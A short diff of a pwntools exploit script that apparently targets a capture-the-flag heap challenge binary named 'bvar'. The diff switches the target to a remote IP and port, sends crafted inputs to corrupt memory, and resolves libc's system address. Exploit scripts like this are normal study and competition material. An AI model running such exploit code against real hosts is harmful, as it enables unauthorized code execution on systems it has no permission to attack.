@@ -1,8 +1,9 @@
 from pwn import *
 
 libc = ELF('./libc-2.31.so')
-p = process('./bvar')
+# p = process('./bvar')
 # p = remote('167.99.78.201', 7777)
+p = remote('35.194.119.116', 7777)
 
 p.sendafter(b'>>> ', b'1=')
 p.sendafter(b'>>> ', b'delete\x00' + b'1')
@@ -36,6 +37,7 @@ system = libc.sym['system']
 log.info('system: ' + hex(system))
 
 p.sendafter(b'>>> ', b'delete')
+p.sendafter(b'>>> ', b'clear')
 
 p.sendafter(b'>>> ', b'1111' + b'=')
 p.sendafter(b'>>> ', b'delete\x00' + b'1111')
